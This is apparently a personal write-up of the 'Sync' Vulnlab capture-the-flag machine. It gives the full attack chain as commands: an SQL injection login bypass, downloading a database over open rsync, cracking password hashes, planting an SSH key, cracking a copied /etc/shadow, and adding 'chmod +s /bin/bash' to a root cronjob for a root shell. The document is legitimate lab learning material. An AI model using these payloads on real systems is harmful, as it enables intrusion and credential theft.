+++
date = '2026-05-21T16:28:32+02:00'
draft = false
title = 'Sync Writeup EN'
+++
**Name**: `joy.scd01`

**Date**: `05/06/2025`

![sync_slide.png](/images/imgs_sync/sync_slide.png)

---
# Introduction

_Sync_ is an _Easy_-level Linux machine.
I found it particularly interesting due to the **progressive escalation chain**, which starts from a basic **rsync exposure**, and ends with **abusing a cronjob** to gain **root privileges**.

Initial access was achieved by enumerating a publicly accessible rsync directory, from which I downloaded a database containing **hashed passwords**.
After cracking them offline, I logged in via **FTP**.

From there, a chain of **lateral movements** allowed me to pivot between multiple users, until I was able to abuse a cronjob to fully compromise the system.

---
# Techniques Used

- **Password Hash Extraction & Cracking**
- **Password Reuse**
- **Unshadow Attack**
- **Cronjob Abuse**

---
# Enumeration

**nmap**

Targeted scan with default scripts and version detection:

```bash
nmap -sC -sV sync
```

![nmap.png](/images/imgs_sync/nmap.png)

**Open ports**:
- **21/tcp** - FTP
- **22/tcp** - SSH
- **80/tcp** - HTTP
- **873/tcp** - RSYNC

**FTP & SSH (ports 21 and 22)**

I first tried logging in via **FTP and SSH**, but both services didn’t support anonymous login.
So I moved to **HTTP** enumeration.

**HTTP - Web Enumeration (port 80)**

The web service exposed on **port 80** displays a simple login form.
I tested a few basic **SQL Injection** payloads and was able to bypass authentication using the classic:

`' OR 1=1 -- -`

in the _Username_ field.

![sqlinjection.png](/images/imgs_sync/sqlinjection.png)

![logged.png](/images/imgs_sync/logged.png)

Since I didn’t find anything useful on the web app, I moved on to enumerating the **rsync** service.

**rsync (port 873)**

I had never used this protocol before, so I did a quick Google search to understand how to interact with it.
Thanks to this article:

[https://hackviser.com/tactics/pentesting/services/rsync](https://hackviser.com/tactics/pentesting/services/rsync)

I learned how to use the enumeration commands:

```bash
rsync sync::
```

The service exposed a **publicly accessible module** named `httpd`, which contained the site’s **SQLite database** (`site.db`).

So, I downloaded it using the _data exfiltration_ command:

```bash
rsync -avz sync::httpd httpd
```

---

# Initial Access | Password Cracking → FTP login as triss

Inspecting the database, I found **hashed passwords** for users **admin** and **triss** in the `users` table.

```sql
sqlite3 site.db
.tables
SELECT * FROM users;
```

![db-hashes.png](/images/imgs_sync/db-hashes.png)

Inside `/www`, I also found the `index.php` file, which revealed useful information about the hashing logic:

```bash
cat index.php
```

![crypt.png](/images/imgs_sync/crypt.png)

In particular:
- The `$secure` variable contains the **salt**.
- The `$hash` variable shows the hash method (**MD5 + salt concatenation**).

I then created a file `hash.txt` with the following format:

```text
a0de4d7f81676c3ea9eabcadfd2536f6:6c4972f3717a5e881e282ad3105de01e|triss|
```

Cracked the hash using **hashcat**:

```bash
hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

![cracked.png](/images/imgs_sync/cracked.png)

Since **SSH required key-based auth**, I tried **FTP** and got initial access:

```bash
ftp triss@sync
```

![ftp-proof.png](/images/imgs_sync/ftp-proof.png)

To get a persistent and interactive shell, I created a `.ssh` directory and added my public key into `authorized_keys`.

```ftp
mkdir .ssh
cd .ssh
put authorized_keys
```

After adjusting permissions, I logged in with:

```bash
ssh -i id_rsa triss@sync
```

![initial-access-proof.png](/images/imgs_sync/initial-access-proof.png)

---
# Lateral Movement 1 - from "triss" to "jennifer" | Password Reuse

Once inside, I found two other users: **jennifer** and **sa**.
When multiple users are present, it’s always worth testing for **password reuse**.

**Note**:_Password reuse is a very common bad practice in real environments. In this case, it allowed lateral movement without any exploitation._

```bash
su jennifer
```

![lateral-proof.png](/images/imgs_sync/lateral-proof.png)

Here I found the **user flag**.

---
# Lateral Movement 2 - from "jennifer" to "sa" | /etc/shadow Dump → Unshadow Attack

From this point, I started enumerating thoroughly.
I usually upload **linpeas** or **pspy64** to help identify suspicious processes and gather privilege escalation vectors.

In this case, from the **jennifer** session, I uploaded **pspy64**, which revealed a **backup script** being periodically executed by root as part of a cronjob.

![pspy64.png](/images/imgs_sync/pspy64.png)

I inspected the script with:

```bash
cat /usr/local/bin/backup.sh
```

![backup.sh.png](/images/imgs_sync/backup.sh.png)

The `backup.sh` script creates a **zip archive** under `/tmp`, which includes sensitive files like `/etc/shadow`.

I simply retrieved the zip and extracted it:

```bash
unzip 1750674841.zip
```

Then performed an **unshadow attack**:

```bash
unshadow passwd shadow > unshadow
john --format=crypt unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```

Switched to user `sa`:

```bash
su sa
```

![lateral2-proof.png](/images/imgs_sync/lateral2-proof.png)

---
# Privilege Escalation | Cronjob Abuse → Root

At this point, I realized that the same script `backup.sh` was **writable** by the `sa` user.

Knowing that the script is executed by root via cronjob, simply injecting a malicious command into the script itself is enough to achieve a clean vertical privilege escalation, **in this case by setting the SUID bit on bash**:

```bash
echo "chmod +s /bin/bash" >> /usr/local/bin/backup.sh
```

After a minute, the cronjob ran allowing me to spawn a **root shell** with:

```bash
/bin/bash -p
```

![system-proof.png](/images/imgs_sync/system-proof.png)

---
# Final Thoughts

As usual, I find Vulnlab machines to be absolute gems.
They always introduce you to new techniques, alternative tools, and real-world applicable scenarios.

This box, in particular, stood out for its clean and realistic **exploit chain**:
from a simple **rsync exposure**, to **password reuse**, **hash cracking**, and finally a **cronjob-based privilege escalation** — all scenarios that could realistically be encountered in real-world environments.

I spent quite some time rooting _Sync_, and my best allies were:
- **pspy64**, for spotting the cronjob
- **linpeas**, for noticing that the backup script was writable by `sa`
_(a detail I had initially missed even though I had already inspected the script)_

**Sources**:

- **Rsync Enumeration Commands**: [https://hackviser.com/tactics/pentesting/services/rsync](https://hackviser.com/tactics/pentesting/services/rsync)

- **Unshadow Attack Reference (YouTube, Esadecimale)** – a channel that has taught me a lot throughout my journey in cybersecurity: [https://www.youtube.com/watch?v=eVlVQHlJC6U&list=PLJnLaWkc9xRiI6Uxygcxrsqlza3KhRy4v&index=8](https://www.youtube.com/watch?v=eVlVQHlJC6U&list=PLJnLaWkc9xRiI6Uxygcxrsqlza3KhRy4v&index=8)